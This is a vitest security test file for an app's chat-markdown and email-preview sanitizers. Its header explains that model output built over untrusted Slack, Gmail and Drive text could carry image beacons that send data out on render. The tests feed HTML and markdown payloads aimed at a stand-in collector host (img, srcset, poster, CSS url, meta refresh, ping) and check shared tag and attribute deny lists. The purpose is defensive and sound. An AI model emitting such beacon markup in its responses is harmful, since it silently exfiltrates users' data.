/**
 * SEC-4 (17-security-review): Assistant and brief markdown is model output over untrusted Slack, Gmail and Drive text.
 * Nothing in it may make the browser fetch a remote URL on render (an image beacon would carry data off this Mac with
 * no click and around the Outbox); links stay, and still need the user's click.
 */
import { describe, expect, it } from 'vitest';

import { FORBID_ATTR, FORBID_TAGS } from '@/client/html-forbid';
import { MARKDOWN_PURIFY, renderMarkdown } from '@/components/chat/markdown';
import { PURIFY_CONFIG, purify } from '@/components/composer/preview';

const EVIL = 'https://collector.example.test/x';

describe('renderMarkdown (SEC-4)', () => {
  it('drops markdown and raw-HTML images, media and SVG', () => {
    const md = [
      `![pipeline](${EVIL}?d=globex-renewal-2m)`,
      `<img src="${EVIL}?a=1">`,
      `<picture><source srcset="${EVIL}?b=1"><img src="${EVIL}?c=1"></picture>`,
      `<video poster="${EVIL}?d=1" src="${EVIL}?e=1"></video><audio src="${EVIL}?f=1"></audio>`,
      `<svg><image href="${EVIL}?g=1" /></svg>`,
      `<p style="background:url(${EVIL}?h=1)">styled</p>`,
      `<link rel="prefetch" href="${EVIL}?i=1"><meta http-equiv="refresh" content="0;url=${EVIL}?j=1">`,
    ].join('\n\n');
    const html = renderMarkdown(md);
    expect(html).not.toMatch(/<(img|picture|source|video|audio|svg|image|link|meta)\b/i);
    expect(html).not.toMatch(/\b(src|srcset|poster|style)=/i);
    expect(html).toContain('styled');
  });

  it('keeps ordinary prose, code and links (a click is the user’s)', () => {
    const html = renderMarkdown(`**Next:** reply to [the thread](https://example.slack.com/archives/C0X/p1) and run \`npm run doctor\`.`);
    expect(html).toContain('<strong>Next:</strong>');
    expect(html).toContain('href="https://example.slack.com/archives/C0X/p1"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('<code>npm run doctor</code>');
  });
});

describe('one forbid list for every purify gate (P25-2)', () => {
  const SEC4_TAGS = ['script', 'style', 'iframe', 'frame', 'object', 'embed', 'form', 'img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'svg', 'math', 'link', 'meta', 'base'];
  const SEC4_ATTRS = ['style', 'srcset', 'poster', 'background', 'formaction', 'xlink:href', 'ping'];

  it('the shared list holds the SEC-4 set, and chat markdown and the composer both use it', () => {
    expect(FORBID_TAGS).toEqual(expect.arrayContaining(SEC4_TAGS));
    expect(FORBID_ATTR).toEqual(expect.arrayContaining(SEC4_ATTRS));
    expect(MARKDOWN_PURIFY.FORBID_TAGS).toEqual([...FORBID_TAGS]);
    expect(MARKDOWN_PURIFY.FORBID_ATTR).toEqual([...FORBID_ATTR]);
    expect(PURIFY_CONFIG.FORBID_TAGS).toEqual([...FORBID_TAGS]);
    // the composer keeps style only through sanitizeStyle; every other SEC-4 attribute is forbidden
    expect(PURIFY_CONFIG.FORBID_ATTR).toEqual(FORBID_ATTR.filter((a) => a !== 'style'));
  });

  it('the email preview drops picture/source/srcset and a style that fetches; a plain inline style stays', () => {
    const out = purify(
      [
        `<picture><source srcset="${EVIL}?b=1"><img src="${EVIL}?c=1"></picture>`,
        `<p style="background:url(${EVIL}?h=1)">fetching</p>`,
        `<p style="color:#123456;margin:0 0 8px 0" background="${EVIL}?k=1">plain</p>`,
        `<video poster="${EVIL}?d=1"></video><audio><track src="${EVIL}?t=1"></audio><a href="https://example.test" ping="${EVIL}?p=1">x</a>`,
      ].join(''),
    );
    expect(out).not.toMatch(/collector\.example\.test/);
    expect(out).not.toMatch(/<(img|picture|source|video|audio|track)\b/i);
    expect(out).toContain('fetching');
    expect(out).toContain('style="color:#123456;margin:0 0 8px 0;"');
  });
});
